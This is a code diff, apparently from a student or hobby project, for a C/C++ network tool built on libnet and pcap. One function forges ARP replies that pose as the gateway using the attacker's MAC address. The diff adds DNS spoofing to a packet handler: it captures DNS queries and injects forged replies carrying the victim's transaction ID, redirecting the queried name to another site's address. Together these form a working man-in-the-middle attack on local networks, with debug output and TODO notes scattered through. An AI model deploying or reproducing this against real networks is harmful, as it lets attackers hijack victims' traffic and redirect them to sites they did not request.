@@ -27,7 +27,7 @@ void spoof(const char *interface_name, char *address) {
     struct libnet_ether_addr *src_hw_addr;
     char errbuf[LIBNET_ERRBUF_SIZE];
 
-    ln = libnet_init(LIBNET_LINK, interface_name, errbuf);
+    ln = libnet_init(LIBNET_LINK, interface_name, errbuf); // on IP layer
     // Returns the MAC address for the device libnet was initialized with:
     src_hw_addr = libnet_get_hwaddr(ln);
     // Takes a dotted decimal string or a canonical DNS name and returns a network byte ordered IPv4 address:
@@ -38,9 +38,9 @@ void spoof(const char *interface_name, char *address) {
     libnet_autobuild_arp(
             ARPOP_REPLY,                     /* operation type       */
             src_hw_addr->ether_addr_octet,   /* sender hardware addr (attacker's mac) */
-            (u_int8_t *) &target_ip_addr,     /* sender protocol addr (gateway's ip)*/
+            (u_int8_t *) &target_ip_addr,    /* sender protocol addr (gateway's ip)*/
             zero_hw_addr,                    /* target hardware addr (any MAC asked)*/
-            (u_int8_t *) &zero_ip_addr,       /* target protocol addr */
+            (u_int8_t *) &zero_ip_addr,      /* target protocol addr */
             ln);                             /* libnet context       */
     libnet_autobuild_ethernet(
             bcast_hw_addr,                   /* ethernet destination */
@@ -59,6 +59,8 @@ void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *frame) {
 
     size_t frame_size = h->caplen;
 
+
+    // TODO move down... or up from here  :)
     int sfd_send;
     struct sockaddr_ll sall_send;
     struct ifreq interface_struct;          // interface structure -> needed for interface identification
@@ -115,26 +117,76 @@ void trap(u_char *user, const struct pcap_pkthdr *h, const u_char *frame) {
                     cmp_questioned_address[4] = 2;
                     cmp_questioned_address[7] = 2;
 
+
                     if (strcmp(questionedAddress, cmp_questioned_address) == 0) {
-                        char new_questioned_address[] = " www.o2.pl";
-                        new_questioned_address[0] = 3;
-                        new_questioned_address[4] = 2;
-                        new_questioned_address[7] = 2;
-                        size_t new_dns_query_size = strlen(new_questioned_address) + 1;
 
-
-                        frame_size = header_size + new_dns_query_size + sizeof(struct QUESTION);
-
-                        ip_hdr->tot_len = htons(static_cast<uint16_t>(frame_size - sizeof(struct ethhdr)));
-                        udp_hdr->len = htons(static_cast<uint16_t>(frame_size - sizeof(struct ethhdr) - (ip_hdr->ihl * 4)));
-
-                        if (new_dns_query_size > dns_query_size) {
-                            realloc((void *) frame, frame_size);
-                            dns_query = (char *) (frame + header_size); // TODO chyba potrzebne?
+                        struct hostent *addrent = gethostbyname("www.o2.pl");
+                        if (addrent->h_length != 4) {
+                            printf("%s", "ERROR!");
                         }
-                        memcpy(dns_query + new_dns_query_size, dns_query + dns_query_size, sizeof(struct QUESTION));
-                        memcpy(dns_query, new_questioned_address, new_dns_query_size);
+                        struct dns_answer answer = dns_answer(*(uint32_t *) addrent->h_addr_list[0]);
 
+                        char* a = reinterpret_cast<char *>(&answer);
+                        printf("%s\n", "ANSWER PRINT:");
+                        for (int i = 0; i < DNS_ANSWER_SIZE; i++) {
+                            printf("%x ", a[i]);
+                        }
+                        printf("\n");
+
+                        u_int32_t datalen = dns_query_size + sizeof(struct QUESTION) + DNS_ANSWER_SIZE;
+                        u_int8_t *data = (u_int8_t *) (malloc(datalen));
+
+                        memcpy(data, dns_query, dns_query_size + sizeof(struct QUESTION));
+                        memcpy(data + dns_query_size + sizeof(struct QUESTION), &answer, DNS_ANSWER_SIZE);
+
+                        printf("%s\n", "DATA PRINT:");
+                        for (int i = 0; i < datalen; i++) {
+                            printf("%x ", data[i]);
+                        }
+                        printf("\n");
+
+                        libnet_ptag_t t;
+                        char errbuf[LIBNET_ERRBUF_SIZE];
+
+                        ln = libnet_init(LIBNET_RAW4_ADV, interface_name, errbuf);
+                        t = libnet_build_dnsv4(
+                                LIBNET_UDP_DNSV4_H,
+                                ntohs(dns_header->transId), /* DNS packet id */
+                                0x8180,                     /* flags: standard reply, no error */
+                                1,                          /* number of questions */
+                                1,                          /* number of answer resource records */
+                                0,                          /* number of authority resource records */
+                                0,                          /* number of additional resource records */
+                                data,                       /* optional payload or NULL */
+                                datalen,                    /* payload length or 0 */
+                                ln,                         /* pointer to a libnet context */
+                                0);                         /* protocol tag to modify an existing header, 0 to build a new one */
+
+                        t = libnet_build_udp(
+                                53,                                             /* source port */
+                                ntohs(udp_hdr->source),                         /* destination port */
+                                LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + datalen,    /* packet size */
+                                0,                                              /* checksum: (0 for libnet to autofill)*/
+                                NULL,                                           /* payload or NULL*/
+                                0,                                              /* payload size or 0*/
+                                ln,                                             /* libnet handle */
+                                0);                                             /* libnet id */
+
+                        /* auto calculate the checksum */
+                        libnet_toggle_checksum(ln, t, LIBNET_ON);
+
+                        t = libnet_autobuild_ipv4( // autobuild is easier then build
+                                LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_UDP_DNSV4_H + datalen, /* length */
+                                IPPROTO_UDP,                                                 /* protocol */
+                                ntohl(ip_hdr->saddr),                                        /* destination IP */
+                                ln);                                                         /* libnet handle */
+
+                        /* auto calculate the checksum */ libnet_toggle_checksum(ln, t, LIBNET_ON);
+                        libnet_write(ln);
+
+                        close(sfd_send);// TODO refactor, don't do this here!
+
+                        return;
                     }
                 }
             }
